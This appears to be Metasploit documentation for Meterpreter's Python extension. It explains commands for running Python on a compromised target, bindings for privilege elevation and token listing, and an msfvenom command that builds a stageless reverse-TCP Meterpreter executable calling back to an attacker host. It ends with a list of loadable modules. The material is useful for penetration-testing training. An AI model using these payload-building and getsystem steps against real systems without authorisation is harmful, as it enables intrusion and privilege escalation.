# Introduction
# Usage
As with any other extension that comes with Meterpreter, loading it is very simple:
```msf
meterpreter > use python
Loading extension python...success.
```

Once loaded, the help system shows the commands that come with the extension:
```msf
meterpreter > help

    ... snip ...

Python Commands
===============

    Command         Description
    -------         -----------
    python_execute  Execute a python command string
    python_import   Import/run a python file or module
    python_reset    Resets/restarts the Python interpreter
```

## python_execute
The `python_execute` command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the `-c` switch. The full help for the command is as follows:
```msf
meterpreter > python_execute -h
Usage: python_execute <python code> [-r result var name]

Runs the given python string on the target. If a result is required,
it should be stored in a python variable, and that variable should
passed using the -r parameter.

OPTIONS:

    -h        Help banner
    -r <opt>  Name of the variable containing the result (optional)
```

A very simple example of this command is shown below:
```msf
meterpreter > python_execute "print 'Hi, from Meterpreter!'"
[+] Content written to stdout:
Hi, from Meterpreter!
```

Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it's visible to the user. This also happens for anything written to stderr, as shown below:
```msf
meterpreter > python_execute "x = x + 1"
[-] Content written to stderr:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'x' is not defined
```

A more interesting example can be seen below:
```msf
meterpreter > python_execute "x = [y for y in range(0, 20) if y % 5 == 0]"
[+] Command executed without returning a result
```

The good thing is that the Python extension is persistent across calls. This means that after the above command is executed, `x` is still present in the interpreter and can be accessed with another call:
```msf
meterpreter > python_execute "print x"
[+] Content written to stdout:
[0, 5, 10, 15]
```

As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the `-r` parameter, as described by the help:
```msf
meterpreter > python_execute "x = [y for y in range(0, 20) if y % 5 == 0]" -r x
[+] x = [0, 5, 10, 15]
```

Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the `-r` parameter:
```msf
meterpreter > python_execute "" -r x
[+] x = [0, 5, 10, 15]
```

## python_import
This command allows for whole modules to be loaded from the attacker's machine an uploaded to the target interpreter. The full help is shown below:
```msf
meterpreter > python_import -h
Usage: python_import <-f file path> [-n mod name] [-r result var name]

Loads a python code file or module from disk into memory on the target.
The module loader requires a path to a folder that contains the module,
and the folder name will be used as the module name. Only .py files will
work with modules.

OPTIONS:

    -f <opt>  Path to the file (.py, .pyc), or module directory to import
    -h        Help banner
    -n <opt>  Name of the module (optional, for single files only)
    -r <opt>  Name of the variable containing the result (optional, single files only)
```

Consider the following script:
```python
# $ cat /tmp/drives.py
import string
from ctypes import windll

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives

result = get_drives()
print result
```

The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows:
```msf
meterpreter > python_import -f /tmp/drives.py
[*] Importing /tmp/drives.py ...
[+] Content written to stdout:
['A', 'C', 'D', 'Z']
```

## python_reset
It may get to a point where the content of the interpreter needs to be flushed. The `python_reset` command clears out all imports, libraries and global variables:
```msf
meterpreter > python_execute "x = 100"
[+] Command executed without returning a result
meterpreter > python_execute "print x"
[+] Content written to stdout:
100

meterpreter > python_reset
[+] Python interpreter successfully reset
meterpreter > python_execute "print x"
[-] Content written to stderr:
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'x' is not defined
```

## Meterpreter Bindings
### Binding list
#### meterpreter.elevate
#### meterpreter.extapi (requires the extapi extension)
#### meterpreter.fs
#### meterpreter.incognito (requires the incognito extension)
#### meterpreter.kiwi (requires the kiwi extension)
#### meterpreter.sys
#### meterpreter.transport
#### meterpreter.user
### Bindings example

```msf
meterpreter > getuid
Server username: WIN-TV01I7GG7JK\oj
meterpreter > python_execute "import meterpreter.user; print meterpreter.user.getuid()"
[+] Content written to stdout:
WIN-TV01I7GG7JK\oj

meterpreter > python_execute "import meterpreter.elevate; meterpreter.elevate.getsystem()"
[+] Command executed without returning a result
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > python_execute "meterpreter.elevate.rev2self(); print meterpreter.user.getuid()"
[+] Content written to stdout:
WIN-TV01I7GG7JK\oj

meterpreter > use incognito
Loading extension incognito...success.
meterpreter > python_execute "import meterpreter.incognito; print meterpreter.incognito.list_user_tokens()"
[+] Content written to stdout:
{'Delegation': ['NT AUTHORITY\\LOCAL SERVICE', 'NT AUTHORITY\\NETWORK SERVICE', 'NT AUTHORITY\\SYSTEM', 'WIN-TV01I7GG7JK\\oj'], 'Impersonation': ['NT AUTHORITY\\ANONYMOUS LOGON']}

meterpreter > python_execute "import meterpreter.fs; print meterpreter.fs.show_mount()"
[+] Content written to stdout:
[{'Name': 'A:\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 2}, {'Name': 'C:\\', 'SpaceUser': 28950585344L, 'SpaceTotal': 64422408192L, 'UNC': None, 'SpaceFree': 28950585344L, 'Type': 3}, {'Name': 'D:\\', 'SpaceUser': None, 'SpaceTotal': None, 'UNC': None, 'SpaceFree': None, 'Type': 5}]
```

## Stageless Initialisation
Not only can the extension be baked into a stageless Meterpreter, like any other extension, it also has the ability to run an arbitrary script before the Meterpreter session is even established! Consider the following script:
```
$  cat /tmp/met.py
import meterpreter.transport
meterpreter.transport.add("tcp://127.0.0.1:8000")
```

To create a stageless payload that uses this script, we can make use of the `EXTINIT` parameter in `msfvenom`:
```
$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4445 EXTENSIONS=stdapi,priv,python EXTINIT=python,/tmp/met.py -f exe -o /tmp/met-stageless.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 6412437 bytes
Saved as: /tmp/met-stageless.exe
```

When this payload is executed, the transport is added and shown to be present in the transport list immediately:
```msf
msf exploit(handler) > [*] Meterpreter session 2 opened (172.16.52.1:4445 -> 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000

msf exploit(handler) > sessions -i -1
[*] Starting interaction with 2...

meterpreter > transport list
Session Expiry  : @ 2015-12-20 11:06:52

    ID  Curr  URL                     Comms T/O  Retry Total  Retry Wait
    --  ----  ---                     ---------  -----------  ----------
    1         tcp://127.0.0.1:8000    300        3600         10
    2   *     tcp://172.16.52.1:4445  300        3600         10
```

## FAQ
## Currently Loadable Native Libraries

```
__future__
__phello__
_abcoll
_osx_support
_pyio
_strptime
_threading_local
_weakrefset
abc
aifc
antigravity
argparse
asynchat
asyncore
atexit
audiodev
base64
BaseHTTPServer
Bastion
bdb
binhex
bisect
calendar
cgi
CGIHTTPServer
cgitb
chunk
cmd
code
codecs
codeop
collections
colorsys
commands
compileall
compiler
compiler.ast
compiler.consts
compiler.future
compiler.misc
compiler.pyassem
compiler.pycodegen
compiler.symbols
compiler.syntax
compiler.transformer
compiler.visitor
ConfigParser
contextlib
Cookie
cookielib
copy
copy_reg
cProfile
csv
ctypes
ctypes._endian
ctypes.util
ctypes.wintypes
decimal
difflib
dircache
dis
DocXMLRPCServer
dummy_thread
dummy_threading
email
email._parseaddr
email.base64mime
email.charset
email.encoders
email.errors
email.feedparser
email.generator
email.header
email.iterators
email.message
email.parser
email.quoprimime
email.utils
email.mime
email.mime.application
email.mime.audio
email.mime.base
email.mime.image
email.mime.message
email.mime.multipart
email.mime.nonmultipart
email.mime.text
encodings
encodings.aliases
encodings.ascii
encodings.base64_codec
encodings.charmap
encodings.cp037
encodings.cp1006
encodings.cp1026
encodings.cp1140
encodings.cp1250
encodings.cp1251
encodings.cp1252
encodings.cp1253
encodings.cp1254
encodings.cp1255
encodings.cp1256
encodings.cp1257
encodings.cp1258
encodings.cp424
encodings.cp437
encodings.cp500
encodings.cp720
encodings.cp737
encodings.cp775
encodings.cp850
encodings.cp852
encodings.cp855
encodings.cp856
encodings.cp857
encodings.cp858
encodings.cp860
encodings.cp861
encodings.cp862
encodings.cp863
encodings.cp864
encodings.cp865
encodings.cp866
encodings.cp869
encodings.cp874
encodings.cp875
encodings.hex_codec
encodings.hp_roman8
encodings.idna
encodings.iso8859_1
encodings.iso8859_10
encodings.iso8859_11
encodings.iso8859_13
encodings.iso8859_14
encodings.iso8859_15
encodings.iso8859_16
encodings.iso8859_2
encodings.iso8859_3
encodings.iso8859_4
encodings.iso8859_5
encodings.iso8859_6
encodings.iso8859_7
encodings.iso8859_8
encodings.iso8859_9
encodings.koi8_r
encodings.koi8_u
encodings.latin_1
encodings.mac_arabic
encodings.mac_centeuro
encodings.mac_croatian
encodings.mac_cyrillic
encodings.mac_farsi
encodings.mac_greek
encodings.mac_iceland
encodings.mac_latin2
encodings.mac_roman
encodings.mac_romanian
encodings.mac_turkish
encodings.mbcs
encodings.palmos
encodings.ptcp154
encodings.punycode
encodings.quopri_codec
encodings.raw_unicode_escape
encodings.rot_13
encodings.string_escape
encodings.tis_620
encodings.undefined
encodings.unicode_escape
encodings.unicode_internal
encodings.utf_16
encodings.utf_16_be
encodings.utf_16_le
encodings.utf_32
encodings.utf_32_be
encodings.utf_32_le
encodings.utf_7
encodings.utf_8
encodings.utf_8_sig
encodings.uu_codec
encodings.zlib_codec
filecmp
fileinput
fnmatch
formatter
fpformat
fractions
ftplib
functools
genericpath
getopt
getpass
gettext
glob
gzip
hashlib
heapq
hmac
htmlentitydefs
htmllib
HTMLParser
httplib
ihooks
imaplib
imghdr
importlib
imputil
inspect
io
json
json.decoder
json.encoder
json.scanner
json.tool
keyword
linecache
locale
logging
logging.config
logging.handlers
macpath
macurl2path
mailbox
mailcap
markupbase
md5
meterpreter
meterpreter.core
meterpreter.elevate
meterpreter.fs
meterpreter.incognito
meterpreter.kiwi
meterpreter.sys
meterpreter.tlv
meterpreter.transport
meterpreter.user
meterpreter.extapi
meterpreter.extapi.adsi
mhlib
mimetools
mimetypes
MimeWriter
modulefinder
multifile
multiprocessing
multiprocessing.connection
multiprocessing.forking
multiprocessing.heap
multiprocessing.managers
multiprocessing.pool
multiprocessing.process
multiprocessing.queues
multiprocessing.reduction
multiprocessing.sharedctypes
multiprocessing.synchronize
multiprocessing.util
multiprocessing.dummy
multiprocessing.dummy.connection
mutex
netrc
new
nntplib
ntpath
nturl2path
numbers
opcode
optparse
os
os2emxpath
pdb
pickle
pickletools
pipes
pkgutil
platform
plistlib
popen2
poplib
posixfile
posixpath
pprint
profile
pstats
py_compile
pyclbr
pydoc
Queue
quopri
random
re
repr
rexec
rfc822
rlcompleter
robotparser
runpy
sched
sets
sgmllib
sha
shelve
shlex
shutil
SimpleHTTPServer
SimpleXMLRPCServer
site
smtplib
sndhdr
socket
SocketServer
sre
sre_compile
sre_constants
sre_parse
ssl
stat
statvfs
string
StringIO
stringold
stringprep
struct
subprocess
sunau
sunaudio
symbol
symtable
sysconfig
tabnanny
tarfile
telnetlib
tempfile
textwrap
this
threading
timeit
toaiff
token
tokenize
trace
traceback
types
urllib
urllib2
urlparse
user
UserDict
UserList
UserString
uu
uuid
warnings
wave
weakref
webbrowser
whichdb
wsgiref
wsgiref.handlers
wsgiref.headers
wsgiref.simple_server
wsgiref.util
wsgiref.validate
xdrlib
xml
xml.dom
xml.dom.domreg
xml.dom.expatbuilder
xml.dom.minicompat
xml.dom.minidom
xml.dom.NodeFilter
xml.dom.pulldom
xml.dom.xmlbuilder
xml.etree
xml.etree.ElementInclude
xml.etree.ElementPath
xml.etree.ElementTree
xml.parsers
xml.sax
xml.sax._exceptions
xml.sax.handler
xml.sax.saxutils
xml.sax.xmlreader
xmllib
xmlrpclib
zipfile
```

